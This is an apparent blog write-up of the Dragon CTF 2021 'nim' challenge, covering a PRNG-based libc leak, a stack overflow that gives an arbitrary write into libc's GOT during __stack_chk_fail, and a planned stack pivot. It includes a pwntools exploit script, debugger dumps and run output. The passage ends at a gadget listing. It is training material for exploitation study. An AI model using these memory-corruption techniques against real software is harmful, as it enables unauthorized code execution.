<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">





<title>Dragon CTF 2021 - nim | kileak</title>





<meta name="description" content="Dragon CTF 2021 - nim">


<meta name="keywords" content="dragon, dragonbox">



<link rel="stylesheet" href="/css/main.css">









<link rel="canonical" href="https://kileak.github.io/ctf/2021/dragoncf21-nim/">
<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4PGFKKP0QW');
</script>


<script>base_url = "";</script>

  </head>
  <body class="">

    <main class="main-container">

        <header class="site-header">

  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>

    <nav class="js-menu sliding-panel-content">
      <ul>
        <li><a href="/">home</a></li>
        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
      </ul>
    </nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>

    <a href="/" class="author-thumb dot">
      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
    </a>

    <!--
    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
    </a>
    -->

    
      <h1 class="post-title">Dragon CTF 2021 - nim</h1>
      <p class="post-meta">Nov 28, 2021</p>
    

  </div>

</header>


        <section class="main-content">
          <article class="post">

  <div class="post-content container">
    <blockquote>
  <p>Nim
<!--break--></p>

  <p>Let’s play a game!</p>

  <p>This challenge is running on Ubuntu 20.04.</p>

  <p>nc nim.hackable.software 1337</p>

  <p>Attachment: <a href="https://kileak.github.io/assets/dragonctf21/nim/nim">nim</a> <a href="https://kileak.github.io/assets/dragonctf21/nim/libc.so">libc.so</a> <a href="https://kileak.github.io/assets/dragonctf21/nim/xpl.py">xpl.py</a></p>

  <p>Team: Super Guesser</p>
</blockquote>

<p>This challenge was an implementation of the <code class="language-plaintext highlighter-rouge">nim</code> game. I joined quite late to the challenge, since I was busy with dragonbox and noflippidy. At that point <code class="language-plaintext highlighter-rouge">n0psledbyte</code> had already done most of the work on the challenge, but was stuck at exploiting it successfully.</p>

<p>Since he went to bed at some point, I digged through his findings and finished it up.</p>

<ul>
  <li>The game uses libc <code class="language-plaintext highlighter-rouge">rand</code> function as seed for its PRNG. Thus we can retrieve libc address by reversing the heap random states.</li>
  <li>Playing the game had a stack overflow when defining size &gt; 32, overwriting following addresses with the heap_sizes defined by the user.</li>
  <li>He also mentioned a possible arbitrary write, when the current hiscore is written.</li>
</ul>

<p>He had already done the PRNG reversing getting libc address and also provided a “solver”, by which we could just win the game anytime by predicting the heap sizes. I won’t go into much detail on this, since I just used his solver script.</p>

<p>But, let’s take a short look at the arbitrary write</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">play_game</span><span class="p">(</span><span class="n">p1_points</span><span class="p">,</span> <span class="n">p1_score</span><span class="p">,</span> <span class="n">p2_points</span><span class="p">,</span> <span class="n">p2_score</span><span class="p">,</span> <span class="n">p3_points</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">32</span><span class="p">),</span> <span class="mh">0x2710u</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">HI_SCORE</span><span class="p">);</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">play_game</span><span class="p">(</span><span class="kt">long</span> <span class="n">p1_score</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">p1_points</span><span class="p">,</span> <span class="kt">long</span> <span class="n">p2_score</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">p2_points</span><span class="p">,</span> <span class="kt">long</span> <span class="n">p3_score</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">p3_points</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a7</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">record</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">current_score</span> <span class="o">&gt;</span> <span class="n">current_record</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[!] </span><span class="se">\"</span><span class="s">`-._,-'</span><span class="se">\"</span><span class="s">`-._,-' NEW ALL TIME RECORD: %d pts </span><span class="se">\"</span><span class="s">`-._,-'</span><span class="se">\"</span><span class="s">`-._,-'</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v39</span><span class="p">);</span>
        <span class="o">*</span><span class="n">record</span> <span class="o">=</span> <span class="n">current_score</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>What’s interesting here is the stack layout in this function call</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">-0000000000000092                 db ? ; undefined
-0000000000000091                 db ? ; undefined
-0000000000000090 s               dd 32 dup(?)
-0000000000000010 CANARY          dq ?
-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005                 db ? ; undefined
-0000000000000004                 db ? ; undefined
-0000000000000003                 db ? ; undefined
-0000000000000002                 db ? ; undefined
-0000000000000001                 db ? ; undefined
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010 a7              dd ?
+0000000000000014                 db ? ; undefined
+0000000000000015                 db ? ; undefined
+0000000000000016                 db ? ; undefined
+0000000000000017                 db ? ; undefined
+0000000000000018 arg_record      dq ?                    ; offset</code></pre></figure>

<p>The <code class="language-plaintext highlighter-rouge">record</code> argument for <code class="language-plaintext highlighter-rouge">play_game</code> will be stored on the stack. This means, we could use the stack overflow when defining the heap sizes to put an arbitrary address into <code class="language-plaintext highlighter-rouge">record</code>, which would lead to an arbitrary 4 byte write</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">*</span><span class="n">record</span> <span class="o">=</span> <span class="n">score</span></code></pre></figure>

<p>The only downside here is, that above the <code class="language-plaintext highlighter-rouge">record</code> pointer, a canary is stored, which we would need to also overwrite in order to reach the <code class="language-plaintext highlighter-rouge">record</code> pointer. This puzzled us a lot, since, if we would know the canary, the arbitrary write would have been completely useless (we could have just put a rop chain there).</p>

<p>Because of this, I assumed, that the only useful thing would be, if we could use the arb write to corrupt something in the <code class="language-plaintext highlighter-rouge">abort</code> functionality, when the application tries to do <code class="language-plaintext highlighter-rouge">__stack_chk_fail</code>, so I went on debugging deeper into <code class="language-plaintext highlighter-rouge">__stack_chk_fail</code>.</p>

<p>This shows, that it wil call <code class="language-plaintext highlighter-rouge">__libc_message</code> in <code class="language-plaintext highlighter-rouge">__fortify_fail</code> to format the abort message, which will call <code class="language-plaintext highlighter-rouge">strlen</code> at some point. For this, libc will look it up from <code class="language-plaintext highlighter-rouge">*ABS*@got.plt</code>.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x00007f1f06650287	93	in ../sysdeps/posix/libc_fatal.c
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x18              
$rbx   : 0x00007f1f0677a082  →  " ***: terminated\n"
$rcx   : 0x00007f1f0677a064  →  "stack smashing detected"
$rdx   : 0x00007ffda1313850  →  0x00007f1f0677a064  →  "stack smashing detected"
$rsp   : 0x00007ffda13137f0  →  0x00007f1f0677a07c  →  "*** %s ***: terminated\n"
$rbp   : 0x00007ffda13138a0  →  0x00007f1f0677a07c  →  "*** %s ***: terminated\n"
$rsi   : 0x25              
$rdi   : 0x00007f1f0677a064  →  "stack smashing detected"
$rip   : 0x00007f1f06650287  →  &lt;__libc_message+311&gt; call 0x7f1f065e5460 &lt;*ABS*+0xa27b0@plt&gt;
$r8    : 0x4               
$r9    : 0x49              
$r10   : 0x000055e22b46552b  →  " pts "`-._,-'"`-._,-'\n"
$r11   : 0x246             
$r12   : 0x00007ffda13137f0  →  0x00007f1f0677a07c  →  "*** %s ***: terminated\n"
$r13   : 0x25              
$r14   : 0x1               
$r15   : 0x1               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f1f06650279 &lt;__libc_message+297&gt; add    rbx, 0x2
   0x7f1f0665027d &lt;__libc_message+301&gt; mov    rdi, rcx
   0x7f1f06650280 &lt;__libc_message+304&gt; mov    QWORD PTR [rbp-0x88], rcx
 → 0x7f1f06650287 &lt;__libc_message+311&gt; call   0x7f1f065e5460 &lt;*ABS*+0xa27b0@plt&gt;
   ↳  0x7f1f065e5460 &lt;*ABS*+0xa27b0@plt+0&gt; endbr64 
      0x7f1f065e5464 &lt;*ABS*+0xa27b0@plt+4&gt; bnd    jmp QWORD PTR [rip+0x1c5c3d]        # 0x7f1f067ab0a8 &lt;*ABS*@got.plt&gt;
      0x7f1f065e546b &lt;*ABS*+0xa27b0@plt+11&gt; nop    DWORD PTR [rax+rax*1+0x0]
      0x7f1f065e5470 &lt;*ABS*+0xa2280@plt+0&gt; endbr64 
      0x7f1f065e5474 &lt;*ABS*+0xa2280@plt+4&gt; bnd    jmp QWORD PTR [rip+0x1c5c35]        # 0x7f1f067ab0b0 &lt;*ABS*@got.plt&gt;
      0x7f1f065e547b &lt;*ABS*+0xa2280@plt+11&gt; nop    DWORD PTR [rax+rax*1+0x0]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffda13137f0│+0x0000: 0x00007f1f0677a07c  →  "*** %s ***: terminated\n"	 ← $rsp, $r12
0x00007ffda13137f8│+0x0008: 0x0000000000000004
0x00007ffda1313800│+0x0010: 0x0000000000000000
0x00007ffda1313808│+0x0018: 0x00007f1f066501de  →  &lt;__libc_message+142&gt; movzx edx, BYTE PTR [rax]
0x00007ffda1313810│+0x0020: 0x00007ffda1313820  →  0x0000000000000018
0x00007ffda1313818│+0x0028: 0x00007f1f0677a064  →  "stack smashing detected"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*ABS*+0xa27b0@plt (
   $rdi = 0x00007f1f0677a064 → "stack smashing detected",
   $rsi = 0x0000000000000025,
   $rdx = 0x00007ffda1313850 → 0x00007f1f0677a064 → "stack smashing detected",
   $rcx = 0x00007f1f0677a064 → "stack smashing detected",
   $r8 = 0x0000000000000004
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</code></pre></figure>

<p>So, we can use the arbitrary write to overwrite the lower 4 bytes of <code class="language-plaintext highlighter-rouge">0x7f1f067ab0a8 &lt;*ABS*@got.plt&gt;</code>, getting code execution for an arbitrary gadget in libc.</p>

<p>Finally getting somewhere.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  telescope $rsp
0x00007ffec488a828│+0x0000: 0x00007f1d5f17628c  →  0x49ffffff788d8b48	 ← $rsp
0x00007ffec488a830│+0x0008: 0x00007f1d5f2a007c  →  "*** %s ***: terminated\n"	 ← $r12
0x00007ffec488a838│+0x0010: 0x0000000000000004
0x00007ffec488a840│+0x0018: 0x0000000000000000
0x00007ffec488a848│+0x0020: 0x00007f1d5f1761de  →  0x800b74d28410b60f
0x00007ffec488a850│+0x0028: 0x00007ffec488a860  →  0x0000000000000018
0x00007ffec488a858│+0x0030: 0x00007f1d5f2a0064  →  "stack smashing detected"
0x00007ffec488a860│+0x0038: 0x0000000000000018

...

0x00007ffec488aac0│+0x0298: 0x006e7ffec488ac10
0x00007ffec488aac8│+0x02a0: 0x00007ffec488aad8  →  0x0000000000000000
0x00007ffec488aad0│+0x02a8: 0x0000000000000000
0x00007ffec488aad8│+0x02b0: 0x0000000000000000
0x00007ffec488aae0│+0x02b8: 0x00007ffec488aaf0  →  0x4141414141414141
0x00007ffec488aae8│+0x02c0: 0x2ef8fca25f16fd27
0x00007ffec488aaf0│+0x02c8: 0x4141414141414141  &lt;= Username
0x00007ffec488aaf8│+0x02d0: 0x4141414141414141
0x00007ffec488ab00│+0x02d8: 0x00007f1d5f1f763c  →  0x801f0fc368c48348
0x00007ffec488ab08│+0x02e0: 0x0000000000000000
0x00007ffec488ab38│+0x0310: 0x20e43bca26fb0a5c
0x00007ffec488ab40│+0x0318: 0x1880e8c9105ed91c
0x00007ffec488ab48│+0x0320: 0x0000001000000010  &lt;= user heap sizes
0x00007ffec488ab50│+0x0328: 0x0000001000000010
0x00007ffec488ab58│+0x0330: 0x0000001000000010
0x00007ffec488ab60│+0x0338: 0x0000001000000010</code></pre></figure>

<p>When checking the current stack layout, we can see that <code class="language-plaintext highlighter-rouge">rsp</code> points to <code class="language-plaintext highlighter-rouge">Username-0x2c8</code> (and also our heap sizes will be after that), so we could try to pivot the stack there.</p>

<p>Let’s start with calculating <code class="language-plaintext highlighter-rouge">libc base</code> by playing the game and reversing the PRNG. Since <code class="language-plaintext highlighter-rouge">Rd</code> had already done this, I just took his code for this:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s">"nim.hackable.software"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1337</span>
<span class="n">PROCESS</span> <span class="o">=</span> <span class="s">"./nim"</span>

<span class="n">const1</span> <span class="o">=</span> <span class="mh">0x7CC216571FEE6FB</span>
<span class="n">const2</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFFFFFFA3</span>
<span class="n">const3</span> <span class="o">=</span> <span class="mh">0x7FFFFFFF</span>

<span class="n">seed</span> <span class="o">=</span> <span class="mh">0x7fab61836e90</span>

<span class="k">def</span> <span class="nf">reverse</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">):</span>
	<span class="k">return</span> <span class="n">x</span><span class="o">*</span><span class="n">y</span> <span class="o">%</span> <span class="n">z</span>

<span class="k">def</span> <span class="nf">drand</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">seed</span>
	<span class="n">v1</span> <span class="o">=</span> <span class="n">seed</span>
	<span class="n">seed</span> <span class="o">=</span> <span class="n">reverse</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span> <span class="n">const1</span><span class="p">,</span> <span class="n">const2</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">v1</span> <span class="o">&amp;</span> <span class="n">const3</span>

<span class="k">def</span> <span class="nf">brute</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">next_state</span><span class="p">):</span>
	<span class="k">global</span> <span class="n">seed</span>
	<span class="n">i</span> <span class="o">=</span> <span class="mh">0xf000</span>
	<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
		<span class="n">brute_state</span> <span class="o">=</span> <span class="n">i</span><span class="o">&lt;&lt;</span><span class="mi">31</span><span class="o">|</span><span class="n">state</span>
		<span class="n">seed</span> <span class="o">=</span> <span class="n">brute_state</span>
		<span class="n">drand</span><span class="p">()</span>
		<span class="k">if</span> <span class="n">seed</span><span class="o">&amp;</span><span class="n">const3</span> <span class="o">==</span> <span class="n">next_state</span><span class="p">:</span>
			<span class="k">return</span> <span class="n">brute_state</span>
		<span class="n">i</span> <span class="o">+=</span> <span class="mh">0x1</span>

<span class="k">def</span> <span class="nf">findLoser</span><span class="p">(</span><span class="n">A</span><span class="p">):</span>
	<span class="n">n</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">A</span><span class="p">)</span>
	<span class="n">res</span> <span class="o">=</span> <span class="mi">0</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
		<span class="n">res</span> <span class="o">^=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

	<span class="c1"># case when Alice is winner
</span>	<span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">n</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
		<span class="k">return</span> <span class="s">"Me"</span>
	<span class="c1"># when Bob is winner
</span>	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="s">"Computer"</span>

<span class="k">def</span> <span class="nf">nim_next</span><span class="p">(</span><span class="n">heaps</span><span class="p">):</span>
	<span class="n">nim</span> <span class="o">=</span> <span class="mi">0</span>

	<span class="c1"># Calculate nim sum for all elements in the objectList
</span>	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">heaps</span><span class="p">:</span>
		<span class="n">nim</span> <span class="o">=</span> <span class="n">nim</span> <span class="o">^</span> <span class="n">i</span>
	<span class="k">if</span> <span class="n">nim</span><span class="p">:</span>
		<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">heaps</span><span class="p">)):</span>
			<span class="n">vv</span> <span class="o">=</span> <span class="n">nim</span><span class="o">^</span><span class="n">heaps</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
			<span class="k">if</span><span class="p">(</span><span class="n">vv</span><span class="o">&lt;</span><span class="n">heaps</span><span class="p">[</span><span class="n">i</span><span class="p">]):</span>
				<span class="k">return</span> <span class="n">i</span><span class="p">,</span> <span class="p">(</span><span class="n">heaps</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-</span><span class="n">vv</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">heaps</span><span class="p">)):</span>
			<span class="k">if</span> <span class="n">heaps</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
				<span class="k">return</span> <span class="n">i</span><span class="p">,</span> <span class="n">heaps</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">win</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
	<span class="n">num_heaps</span> <span class="o">=</span> <span class="mi">9</span>
	<span class="n">play</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">num_heaps</span><span class="p">)</span>

	<span class="n">predict</span> <span class="o">=</span> <span class="p">[</span><span class="n">drand</span><span class="p">()</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">num_heaps</span><span class="o">/</span><span class="mi">2</span><span class="p">))]</span>
	<span class="n">predict</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">predict</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">^</span><span class="mi">3</span>
	<span class="n">predict</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">predict</span><span class="p">)):</span>
		<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">predict</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>

	<span class="n">last</span> <span class="o">=</span> <span class="mi">0</span>
	<span class="k">while</span> <span class="n">last</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
		<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"heaps is: "</span><span class="p">)</span>
		<span class="n">heap_state</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"]"</span><span class="p">)))</span>
		
		<span class="k">if</span> <span class="n">heap_state</span><span class="p">.</span><span class="n">count</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">num_heaps</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span>
			<span class="n">last</span> <span class="o">=</span> <span class="mi">1</span>
		
		<span class="n">idx</span><span class="p">,</span> <span class="n">val</span> <span class="o">=</span> <span class="n">nim_next</span><span class="p">(</span><span class="n">heap_state</span><span class="p">)</span>

		<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
		<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">play</span><span class="p">(</span><span class="n">bet</span><span class="p">,</span> <span class="n">num_heaps</span><span class="p">):</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"? "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">bet</span><span class="p">))</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"? "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">num_heaps</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Start playing game"</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Choice:"</span><span class="p">,</span> <span class="s">"P"</span><span class="p">)</span>

	<span class="c1"># send username
</span>	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"? "</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">31</span><span class="p">)</span>

	<span class="n">num_heaps</span> <span class="o">=</span> <span class="mi">8</span>
	<span class="n">play</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="n">num_heaps</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Dealer has decided the sizes of heaps 1 - 4, now specify yours"</span><span class="p">)</span>

	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">num_heaps</span><span class="o">/</span><span class="mi">2</span> <span class="o">+</span> <span class="mf">0.5</span><span class="p">)):</span>
		<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>

	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"taken "</span><span class="p">)</span>
	<span class="n">stones_taken</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" "</span><span class="p">)))</span>
	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"from heap "</span><span class="p">)</span>
	
	<span class="n">taken_idx</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"."</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span> <span class="o">-</span><span class="mi">1</span>

	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"heaps is: "</span><span class="p">)</span>
	<span class="n">heap_state</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"]"</span><span class="p">)))</span>

	<span class="n">heap_state</span><span class="p">[</span><span class="n">taken_idx</span><span class="p">]</span> <span class="o">+=</span> <span class="n">stones_taken</span>

	<span class="n">rand_addr</span> <span class="o">=</span> <span class="n">brute</span><span class="p">(</span><span class="n">heap_state</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">heap_state</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
	<span class="n">seed</span> <span class="o">=</span> <span class="n">rand_addr</span>
	<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">rand_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"rand"</span><span class="p">]</span>
	
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">rand_addr</span><span class="p">))</span>	
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC      : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>

	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>

	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
		<span class="n">drand</span><span class="p">()</span>

	<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
	
	<span class="k">return</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
	<span class="c1"># e = ELF("./nim")
</span>	<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so"</span><span class="p">)</span>

	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
		<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
		<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>		
	<span class="k">else</span><span class="p">:</span>
		<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
		<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./nim"</span><span class="p">)</span>
		<span class="k">print</span> <span class="p">(</span><span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
		<span class="n">pause</span><span class="p">()</span>
	
	<span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python work.py 
[*] '/media/sf_ctf/dragon21/nim/libc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './nim': pid 2242
[2242]
[*] Paused (press any to continue)
[*] Start playing game
[*] LIBC leak : 0x7f3c2c62ee90
[*] LIBC      : 0x7f3c2c5e4000
[*] Switching to interactive mode

[?] Choose a heap (0 to resign): $  </code></pre></figure>

<p>Having a leak to <code class="language-plaintext highlighter-rouge">libc</code>, we can now think on how to get code execution. As mentioned above, when <code class="language-plaintext highlighter-rouge">strlen</code> will be called from <code class="language-plaintext highlighter-rouge">__libc_message</code> the stack will point to <code class="language-plaintext highlighter-rouge">username-0x2c8</code>, so we would want to pivot the stack into something controllable.</p>

<p>Checking the available libc gadgets:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x0000000000089d27: add rsp, 0x2c0; pop rbp; pop r12; pop r13; ret;</code></pre></figure>

